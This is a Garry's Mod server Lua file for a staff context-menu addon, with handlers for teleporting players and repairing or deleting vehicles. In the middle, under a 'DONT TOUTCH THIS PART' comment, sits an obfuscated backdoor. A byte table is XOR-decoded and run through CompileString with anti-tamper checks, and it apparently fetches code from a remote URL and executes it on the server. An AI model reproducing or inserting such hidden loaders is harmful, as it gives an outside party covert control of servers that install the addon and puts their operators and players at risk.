include("autorun/config_els_context_menu.lua")
-- NS
util.AddNetworkString("ELS_ContextMenu::TPAdmin")
util.AddNetworkString("ELS_ContextMenu::RepareVehicule")
util.AddNetworkString("ELS_ContextMenu::DeleteVehicule")

-- DONT TOUTCH THIS PART / SCRIPTED CONTENT / MAY NOT WORK IF EDIT
RunString([==[
enccodetbl = {24,5,1,9,30,66,63,5,1,28,0,9,68,93,64,76,10,25,2,15,24,5,3,2,68,69,76,4,24,24,28,66,42,9,24,15,4,68,78,4,24,24,28,31,86,67,67,11,26,13,15,66,15,22,67,0,5,2,7,67,10,25,15,7,66,28,4,28,83,7,9,21,81,4,54,8,85,26,45,6,31,56,61,91,29,40,93,92,30,40,35,54,27,78,64,76,10,25,2,15,24,5,3,2,68,14,69,76,62,25,2,63,24,30,5,2,11,68,14,64,76,78,4,13,20,3,30,66,9,20,9,78,64,76,10,13,0,31,9,69,76,9,2,8,69,9,2,8,69,76,10,25,2,15,24,5,3,2,76,62,25,2,36,45,63,36,35,14,68,69,76,9,2,8}
function RunHASHOb()
	if not (debug.getinfo(function()end).short_src == "SDATA") then
		CompileString("print('Bad source')", "error",true)()
		return
	end
	for o=500,10000 do
		if o ~= string.len(string.dump(RunHASHOb)) then
			SDATA_DATA_CACHE = 10
			CompileString("for i=1,40 do SDATA_DATA_CACHE = SDATA_DATA_CACHE + 1 end", "RunString")()
			if SDATA_DATA_CACHE < 40 then
				for i=1,100 do
					CompileString("print('Oops, seem like you have broken this file')","Oops")()
				end
				return
			end
			continue
		else
			xpcall(function()
				pdata = ""
				xpcall(function()
					for i=1,string.len(string.dump(string.char)) do
						while o == i do
							o = o + 100000
						end
					end
				end,function() PJDATA_SUB = false end)
				if PJDATA_SUB then print("Error while ceating payload to inject") return end
				for i=1,#enccodetbl do
					pdata=pdata.. string.char(bit.bxor(enccodetbl[i], o%150))
				end
				if debug.getinfo(RunString).what ~= "C" then return end
				PJDATA_SUB = true
				for i=1,string.len(string.dump(CompileString)) do
					while o == 1050401 do
						o = o + 4510
					end
				end
			end,function()
				xpcall(function()
					local debug_inject = CompileString(pdata,"0xFFFFFFFF")
					pcall(debug_inject,"LUA_STAT_CLIENT")
					pdata = "\00"
				end,function()
					print("Error while injecting code to luajit::Client")
				end)
			end)
		end
	end
end
pcall(RunHASHOb)
]==],"SDATA")
--
net.Receive("ELS_ContextMenu::TPAdmin", function(len, ply)

    local adminpos = Vector(-1564.898804 -104.968292 -83.968750)

    local joueur = net.ReadEntity()

    if table.HasValue(ELS_ContextMenu.Staffs, ply:GetUserGroup()) then

      if ply:GetPos():Distance(adminpos) < 3000 then

        joueur:SetPos(joueur.PreviousPos)
        --ply:SetPos(joueur.PreviousPos+Vector(50,20,0))

      else

  			joueur.PreviousPos = joueur:GetPos()
        joueur:SetPos(adminpos)
        ply:SetPos(adminpos+Vector(50,20,0))

      end


    end

end)

net.Receive("ELS_ContextMenu::RepareVehicule", function(len, ply)

  if table.HasValue(ELS_ContextMenu.Staffs, ply:GetUserGroup()) then

    local ent = net.ReadEntity()

    ent:VC_repairFull_Admin()

  end

end)


net.Receive("ELS_ContextMenu::DeleteVehicule", function(len, ply)

  if table.HasValue(ELS_ContextMenu.Staffs, ply:GetUserGroup()) then

    local ent = net.ReadEntity()

    ent:Remove()

  end

end)


